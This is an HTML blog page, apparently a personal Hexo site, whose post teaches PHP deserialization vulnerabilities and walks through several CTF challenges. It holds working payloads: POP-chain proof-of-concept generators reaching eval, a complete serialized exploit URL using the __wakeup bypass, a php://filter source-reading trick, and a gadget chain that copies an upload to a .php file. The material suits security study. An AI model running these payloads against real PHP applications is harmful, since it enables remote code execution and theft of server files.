@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>PHP反序列化学习 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="PHP序列化浅析首先简单了解下PHP 序列化函数，PHP序列化是将一个对象、数组、字符串等转化为字节流便于传输，比如跨脚本等。而PHP反序列化是将序列化之后的字节流还原成对象、字符、数组等。但是PHP序列化是不会保存对象的方法。 PHP代码实例。 序列化格式。    &amp;lt;?php class CB {     public $CB_data = &amp;apos;cb&amp;apos;; }  class">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP反序列化学习">
+<meta property="og:url" content="http://yoursite.com/2019/04/20/反序列化学习/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="PHP序列化浅析首先简单了解下PHP 序列化函数，PHP序列化是将一个对象、数组、字符串等转化为字节流便于传输，比如跨脚本等。而PHP反序列化是将序列化之后的字节流还原成对象、字符、数组等。但是PHP序列化是不会保存对象的方法。 PHP代码实例。 序列化格式。    &amp;lt;?php class CB {     public $CB_data = &amp;apos;cb&amp;apos;; }  class">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1559048926.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1559049070.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1559053757.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1559091758.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1559051080.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1559051188.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555749777.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555749843.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1555750520.jpg">
+<meta property="og:updated_time" content="2019-05-29T14:05:28.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP反序列化学习">
+<meta name="twitter:description" content="PHP序列化浅析首先简单了解下PHP 序列化函数，PHP序列化是将一个对象、数组、字符串等转化为字节流便于传输，比如跨脚本等。而PHP反序列化是将序列化之后的字节流还原成对象、字符、数组等。但是PHP序列化是不会保存对象的方法。 PHP代码实例。 序列化格式。    &amp;lt;?php class CB {     public $CB_data = &amp;apos;cb&amp;apos;; }  class">
+<meta name="twitter:image" content="http://47.106.185.69/1/./img/1559048926.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-反序列化学习" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/20/反序列化学习/" class="article-date">
+  <time datetime="2019-04-19T16:00:00.000Z" itemprop="datePublished">2019-04-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PHP反序列化学习
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PHP序列化浅析"><a href="#PHP序列化浅析" class="headerlink" title="PHP序列化浅析"></a>PHP序列化浅析</h1><p>首先简单了解下PHP 序列化函数，PHP序列化是将一个对象、数组、字符串等转化为字节流便于传输，比如跨脚本等。而PHP反序列化是将序列化之后的字节流还原成对象、字符、数组等。但是PHP序列化是不会保存对象的方法。</p>
+<p>PHP代码实例。</p>
+<p>序列化格式。<br>    &lt;?php</p>
+<pre><code>class CB {
+    public $CB_data = &apos;cb&apos;;
+}
+
+class test extends CB
+{
+    public $data;
+    public  $pass;
+    const SECOND = 60;//常量值
+
+    public function __construct($data, $pass)
+    {
+      $this-&gt;data = $data;
+      $this-&gt;pass = $pass;
+    }
+}
+$number = 66;
+$str = &apos;String&apos;;
+$bool = true;
+$null = NULL;
+$arr = array(&apos;a&apos; =&gt; 1, &apos;b&apos; =&gt; 2);
+$cc = new test(&apos;peiqi&apos;, true);
+
+$a=serialize($cc);
+echo $a;
+echo unserialize($a);
+echo &quot;&lt;br/&gt;&quot;;echo &quot;&lt;br/&gt;&quot;;
+var_dump(serialize($number));echo &quot;&lt;br/&gt;&quot;;
+var_dump(serialize($str));echo &quot;&lt;br/&gt;&quot;;
+var_dump(serialize($bool));echo &quot;&lt;br/&gt;&quot;;
+var_dump(serialize($null));echo &quot;&lt;br/&gt;&quot;;
+var_dump(serialize($arr));echo &quot;&lt;br/&gt;&quot;;
+var_dump(serialize($cc));
+
+?&gt;</code></pre><p>打印出来</p>
+<pre><code>string(5) &quot;i:66;&quot; 
+string(13) &quot;s:6:&quot;String&quot;;&quot; 
+string(4) &quot;b:1;&quot; 
+string(2) &quot;N;&quot; 
+string(30) &quot;a:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;}&quot; 
+string(76) &quot;O:4:&quot;test&quot;:3:{s:4:&quot;data&quot;;s:5:&quot;peiqi&quot;;s:4:&quot;pass&quot;;b:1;s:7:&quot;CB_data&quot;;s:2:&quot;cb&quot;;}&quot;//注意私有变量和共有变量区别，继承的变量可以序列化保存，但是常量不会保存。</code></pre><h2 id="为什么要用序列化"><a href="#为什么要用序列化" class="headerlink" title="为什么要用序列化"></a>为什么要用序列化</h2><p>序列化是将变量转换为可保存或传输的字符串的过程；反序列化就是在适当的时候把这个字符串再转化成原来的变量使用。这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p>
+<p>假设有个class，这个class里面存有一些变量。当这个class被实例化了之后，在使用过程中里面的一些变量值发生了改变。以后在某些时候还会用到这个变量，如果我们让这个class一直不销毁，等着下一次要用它的时候再一次被调用的话，浪费系统资源。当我们写一个小型的项目可能没有太大的影响，但是随着项目的壮大，一些小问题被放大了之后就会产生很多麻烦。这个时候PHP就和我们说，你可以把这个对象序列化了，存成一个字符串，当你要用的时候再放他出来就好了，也正是这个特性使得存在了PHP反序列化漏洞。</p>
+<h1 id="序列化漏洞"><a href="#序列化漏洞" class="headerlink" title="序列化漏洞"></a>序列化漏洞</h1><p>要了解PHP反序列化漏洞至关重要的是利用魔术方法，产生序列化漏洞往往是控制了参数，调用了魔术方法，然后造成漏洞。魔法函数一般是以__开头，通常会因为某些条件而触发不用我们手动调用。</p>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><pre><code>1.__construct，__destruct
+__construct构建对象的时被调用；
+__destruct明确销毁对象或脚本结束时被调用；
+2.__get，__set
+__set当给不可访问或不存在属性赋值时被调用
+__get读取不可访问或不存在属性时被调用
+3.__isset，__unset
+__isset对不可访问或不存在的属性调用isset()或empty()时被调用
+__unset对不可访问或不存在的属性进行unset时被调用
+4.__call，__callStatic
+__call调用不可访问或不存在的方法时被调用
+__callStatic调用不可访问或不存在的静态方法时被调用
+5.__sleep，__wakeup
+__sleep当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用
+__wakeup当使用unserialize时被调用，可用于做些对象的初始化操作
+6.__clone
+进行对象clone时被调用，用来调整对象的克隆行为
+7.__toString
+当一个类被转换成字符串时被调用
+8.__invoke
+当以函数方式调用对象时被调用
+9.__set_state
+当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。
+10.__debuginfo
+当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</code></pre><p>举例：</p>
+<pre><code>    &lt;?php
+class A{
+    var $test = &quot;test&quot;;
+    function __destruct(){
+            echo $this-&gt;test;
+    }
+}
+$a = $_GET[&apos;test&apos;];
+$a_unser = unserialize($a);
+
+?&gt;</code></pre><p>构造反序列化poc，然后触发魔术方法__destruct()（明确销毁对象或脚本结束时被调用）,</p>
+<p>正常输出应该为test。</p>
+<p><img src="http://47.106.185.69/1/./img/1559048926.jpg" alt></p>
+<p>通过代码构造poc</p>
+<pre><code>&lt;?
+class A{
+    var $test = &quot;test&quot;;
+    function __destruct(){
+            echo $this-&gt;test;
+    }
+}
+$c= new A();
+$c-&gt;test=&quot;123456&quot;;
+echo serialize($c);
+echo &quot;&lt;br/&gt;&quot;;echo &quot;&lt;br/&gt;&quot;;
+?&gt;</code></pre><p>获得</p>
+<pre><code>O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:6:&quot;123456&quot;;}</code></pre><p>最终可以任意控制输出结果。</p>
+<p><img src="http://47.106.185.69/1/./img/1559049070.jpg" alt></p>
+<p>一些魔术方法的作用。</p>
+<pre><code>&lt;?php
+class test{
+    public $abc=123;
+    var $test = &apos;123&apos;;
+    function __wakeup(){
+        echo &quot;__wakeup&quot;;
+        echo &quot;&lt;/br&gt;&quot;;
+    }
+    function __construct($filename = &apos;&apos;){
+        $this -&gt; abc = $filename;
+        echo &quot;__construct&quot;;
+        echo &quot;&lt;/br&gt;&quot;;
+    }
+    function __destruct(){
+        echo &quot;__destruct&quot;;
+        echo &quot;&lt;/br&gt;&quot;;
+    }
+    function abc()
+    {
+        echo $this -&gt; abc ;
+    }
+}
+
+$class2 = &apos;O:4:&quot;test&quot;:2:{s:3:&quot;abc&quot;;s:12:&quot;xiaozhupeiqi&quot;;s:4:&quot;test&quot;;s:3:&quot;123&quot;;}&apos;;
+
+$class2_unser = unserialize($class2);
+echo $class2_unser -&gt;abc();
+
+echo &quot;&lt;/br&gt;&quot;;
+
+?&gt;</code></pre><p>结果。</p>
+<p><img src="http://47.106.185.69/1/./img/1559053757.jpg" alt></p>
+<p>相同的函数名，构造利用。</p>
+<pre><code>&lt;?php
+class test {
+
+    var $test1;
+    function __construct() {
+        $this-&gt;test = new xzpq();
+    }
+    function __destruct() {
+        $this-&gt;test-&gt;func();
+    }
+}
+class xzpq {
+    function func() {
+        echo &quot;serialize test&quot;;
+    }
+}
+class xzpq1 {
+    var $test2;
+    function func() {
+        eval($this-&gt;test2);
+    }
+}
+$class = new test();
+unserialize($_GET[&apos;test&apos;]);
+?&gt;</code></pre><p>正常链是new test()对象，然后魔术方法调用 $this-&gt;test = new xzpq(); 然后下一个魔术方法调用func()函数最终输出serialize test</p>
+<p>利用:利用反序列化触发第一个魔术方法，覆盖使其new xzpq1方法，然后自动调用第二个func，在构造poc里传入test2值达到任意代码执行漏洞。</p>
+<pre><code>class test {
+
+    var $test1;
+    function __construct() {
+        $this-&gt;test = new xzpq1();
+    }
+    function __destruct() {
+        $this-&gt;test-&gt;func();
+    }
+}
+class xzpq {
+    function func() {
+        echo &quot;serialize test&quot;;
+    }
+}
+class xzpq1 {
+    var $test2=&quot;phpinfo();&quot;;
+    function func() {
+        eval($this-&gt;test2);
+    }
+}
+$class = new test();
+echo serialize($class);</code></pre><p><img src="http://47.106.185.69/1/./img/1559091758.jpg" alt></p>
+<h2 id="实战CTF-web"><a href="#实战CTF-web" class="headerlink" title="实战CTF-web"></a>实战CTF-web</h2><p>难度0.1</p>
+<p>url:<a href="http://web.jarvisoj.com:32768/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/index.php</a></p>
+<p>比较简单，读取源码，这就不说了自己去读，然后这是三个文件源码。</p>
+<p>shield.php</p>
+<pre><code>&lt;?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = &apos;&apos;) {
+            $this -&gt; file = $filename;
+        }
+
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+?&gt;</code></pre><p>index.php</p>
+<pre><code>&lt;?php 
+    require_once(&apos;shield.php&apos;);
+    $x = new Shield();
+    isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];
+    if (!empty($g)) {
+        $x = unserialize($g);
+    }
+    echo $x-&gt;readfile();
+?&gt;
+&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</code></pre><p>showimg.php</p>
+<pre><code>&lt;?php
+    $f = $_GET[&apos;img&apos;];
+    if (!empty($f)) {
+        $f = base64_decode($f);
+        if (stripos($f,&apos;..&apos;)===FALSE &amp;&amp; stripos($f,&apos;/&apos;)===FALSE &amp;&amp; stripos($f,&apos;\\&apos;)===FALSE
+        &amp;&amp; stripos($f,&apos;pctf&apos;)===FALSE) {
+            readfile($f);
+        } else {
+            echo &quot;File not found!&quot;;
+        }
+    }
+?&gt;</code></pre><p>流程解析：</p>
+<p>很明显需要index.php 与 shield.php 结合，传入class反序列化串，传入完成后触发__construct 方法，来传入file值，然后利用</p>
+<pre><code>function readfile() {
+                if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  
+                &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
+                    return @file_get_contents($this-&gt;file);
+                }</code></pre><p>来读取源码。</p>
+<p>构造poc：<br>    &lt;?php<br>    class Shield {<br>            public $file;<br>            function __construct($filename = ‘’) {<br>                $this -&gt; file = $filename;<br>            }</p>
+<pre><code>        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+
+$a=new shield();
+$a-&gt;file=&quot;pctf.php&quot;;
+echo serialize($a);
+
+?&gt;</code></pre><p><img src="http://47.106.185.69/1/./img/1559051080.jpg" alt></p>
+<p><img src="http://47.106.185.69/1/./img/1559051188.jpg" alt></p>
+<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>题目打开：</p>
+<p><img src="http://47.106.185.69/1/./img/1555749777.jpg" alt></p>
+<p>右键查看源码，</p>
+<p><img src="http://47.106.185.69/1/./img/1555749843.jpg" alt></p>
+<p>发现是文件包含，并且有提示hint.php。 </p>
+<p>使用php://filter/read=convert.base64-encode/resource=index.php ，分别读出index.php和hint.php源码。</p>
+<p><img src="http://47.106.185.69/1/./img/1555750520.jpg" alt></p>
+<p>index.php</p>
+<pre><code>&lt;html&gt;
+&lt;?php
+error_reporting(0); 
+$file = $_GET[&quot;file&quot;]; 
+$payload = $_GET[&quot;payload&quot;];
+if(!isset($file)){
+    echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;
+}
+if(preg_match(&quot;/flag/&quot;,$file)){
+    die(&apos;hack attacked!!!&apos;);
+}
+@include($file);
+if(isset($payload)){  
+    $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);
+    parse_str($url[&apos;query&apos;],$query);
+    foreach($query as $value){
+        if (preg_match(&quot;/flag/&quot;,$value)) { 
+            die(&apos;stop hacking!&apos;);
+            exit();
+        }
+    }
+    $payload = unserialize($payload);
+}else{ 
+   echo &quot;Missing parameters&quot;; 
+} 
+?&gt;
+&lt;!--Please test index.php?file=xxx.php --&gt;
+&lt;!--Please get the source of hint.php--&gt;
+&lt;/html&gt;</code></pre><p>hint.php</p>
+<pre><code>&lt;?php  
+class Handle{ 
+    private $handle;  
+    public function __wakeup(){
+        foreach(get_object_vars($this) as $k =&gt; $v) {
+            $this-&gt;$k = null;
+        }
+        echo &quot;Waking up\n&quot;;
+    }
+    public function __construct($handle) { 
+        echo 123;
+        $this-&gt;handle = $handle; 
+
+    } 
+    public function __destruct(){
+
+        echo 456;
+        $this-&gt;handle-&gt;getFlag();
+
+    }
+}
+
+class Flag{
+    public $file;
+    public $token;
+    public $token_flag;
+
+    function __construct($file){
+        $this-&gt;file = $file;
+        $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));
+    }
+
+    public function getFlag(){
+        echo &quot;666&quot;;
+        $this-&gt;token_flag = md5(rand(1,10000));
+        if($this-&gt;token === $this-&gt;token_flag)
+        {
+            if(isset($this-&gt;file)){
+                echo @highlight_file($this-&gt;file,true); 
+            }  
+        }
+    }
+}
+?&gt;</code></pre><p>index.php中可以传参两个参数，并且有明显的反序列化函数unserialize，应该是反序列化漏洞，在首先file包含hint.php才能调用class读取flag.php。但是无法读取flag.php，有明显的正则拦截。 </p>
+<pre><code>parse_str($url[&apos;query&apos;],$query);
+foreach($query as $value){</code></pre><p>将当前赋值给网站参数值赋值给value，使用双斜线使得$url[‘query’]无效，绕过第二个过滤。</p>
+<p>反序列化解析：</p>
+<p>传入payload会被反序列化，传入特定序列化参数，实例化Handle类，传入$handle参数实例化class Flag，在Handle类里销毁时调用魔法函数function __destruct()调用$this-&gt;handle-&gt;getFlag();来执行flag函数，Flag类需要传入file参数，这里传入flag.php代码，从而读取flag.php的源码获得flag。</p>
+<p>在hint.php 生成序列化payload。加入以下代码</p>
+<pre><code>#$a = new Flag(&apos;./flag.php&apos;);
+
+#$test = new Handle($a);
+
+#echo serialize($test);</code></pre><p>其中handle是private所以需要改成%00Handle%00handle，双//绕过value拦截flag字段。最终payload，反序列化的时候会调用wakeup方法，绕过方式。</p>
+<pre><code>wakeup方法(CVE-2016-7124)
+
+ O:6:&quot;sercet&quot;:1:  也就是输入比1大的值就行   如O:6:&quot;sercet&quot;:2: </code></pre><p>最终payload</p>
+<pre><code>http://604abe9ee70d4acab8aea61f547235a56c60f822bc734cf3.changame.ichunqiu.com//index.php?file=hint.php&amp;payload=O:6:%22Handle%22:2:{s:14:%22%00Handle%00handle%22;O:4:%22Flag%22:3:{s:4:%22file%22;s:10:%22./flag.php%22;s:5:%22token%22;s:32:%22ab4c389364232588a6680ad92ec170c7%22;s:10:%22token_flag%22;s:32:%22ab4c389364232588a6680ad92ec170c7%22;}}</code></pre><p>直接访问请求即可脚本跑出md5，按概率学来说一万个就能百分百跑出来。相等即可获得flag。</p>
+<h2 id="强网杯–upload"><a href="#强网杯–upload" class="headerlink" title="强网杯–upload"></a>强网杯–upload</h2><p>访问 <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> 下载源码。</p>
+<p>四个核心文件，上传发现是上传之后全部重新命名，服务器命名后缀无法绕过，但是有序列化函数，推断很可能是反序列化漏洞。</p>
+<p>发现profile文件里的call魔术方法。</p>
+<pre><code>public function __call($name, $arguments)
+{
+    if($this-&gt;{$name}){
+        $this-&gt;{$this-&gt;{$name}}($arguments);
+    }
+}</code></pre><p>利用这一行$this-&gt;{$this-&gt;{$name}}($arguments); 如果可以控制name以及arguments值，那么就可以调用任意方法了。</p>
+<p>发现upload中有可以利用的点。@copy($this-&gt;filename_tmp, $this-&gt;filename);，如果这后面的参数可控，那么我么就可以任意控制命名。就可以上传PHP文件，那么就需要绕过这个点。</p>
+<pre><code>if(!empty($_FILES)){
+           $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+           $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;;
+           $this-&gt;ext_check();
+       }</code></pre><p>那么本题就是绕过empty检测，然后利用魔术方法调用upload_img进行上传。</p>
+<p>那么下一步寻找反序列化点，发现会将我们的cookie反序列化</p>
+<pre><code>if(!empty($profile)){
+    $this-&gt;profile=unserialize(base64_decode($profile));
+    $this-&gt;profile_db=db(&apos;user&apos;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&apos;ID&apos;]))-&gt;find();
+    if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null){
+        return 1;
+    }else{
+        return 0;
+    }
+}</code></pre><p>要进入call魔术方法需要条件。当调用类中不存在的方法时，就会调用__call();</p>
+<p>如我们控制反序列化字符串，使之反序列化Register类，控制$this-&gt;checker为Profile类，就可以对Profile类调用index()方法，而在Profile类中不存在此方法，就会进入__call方法，然后call方法直接调用 upload_img() 函数，从而上传。但是<br>    代码一：$this-&gt;checker-&gt;index();</p>
+<pre><code>代码二：$this-&gt;{$this-&gt;{$name}}($arguments);</code></pre><p>这里调用的是Profile-&gt;index(),无法控制，所以此时需要寻找可以调用可控的方法，因为index()方法不存在，所以调用魔术方法</p>
+<pre><code>public function __get($name)               //如果调用的变量属性不存在，反序列化就会默认调用__get()方法，$name是属性名
+   {
+       return $this-&gt;except[$name];
+   }</code></pre><p>然后传入可控变量$this-&gt;except[$name]; 然后传入upload_img，最终调用upload_img函数，然后在覆盖变量，</p>
+<pre><code>$pro-&gt;filename_tmp = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/b1a224c24d78e208556d6206b9ec7c72.png&apos;;
+$pro-&gt;filename = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/gurenmeng.php&apos;;</code></pre><p>然后就能最终上传上去php文件。</p>
+<pre><code>payload:
+
+&lt;?php
+namespace app\web\controller;
+
+class Profile{
+    public $ext;
+    public $filename_tmp;
+    public $filename;
+    public $except;
+}
+
+class Register{
+
+    public $checker;
+    public $registed;
+
+}
+
+$reg = new Register();
+$pro = new Profile();
+$pro-&gt;except = array(&apos;index&apos;=&gt;&apos;upload_img&apos;);
+$pro-&gt;ext = 1;
+$pro-&gt;filename_tmp = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/b1a224c24d78e208556d6206b9ec7c72.png&apos;;
+$pro-&gt;filename = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/gurenmeng.php&apos;;
+$reg-&gt;checker = $pro;
+$reg-&gt;registed = 0;
+echo base64_encode(serialize($reg));
+
+?&gt;</code></pre><p>收藏文章：<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+<p>参考：<a href="https://www.cnblogs.com/youyoui/p/8610068.html" target="_blank" rel="noopener">https://www.cnblogs.com/youyoui/p/8610068.html</a><br>参考：<a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/04/20/反序列化学习/" data-id="ck0l0oh9v001upy2ihucpdjjd" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/05/17/url跳转实战/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          渗透之url跳转
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/04/14/2019DDCTF/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2019DDCTF</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
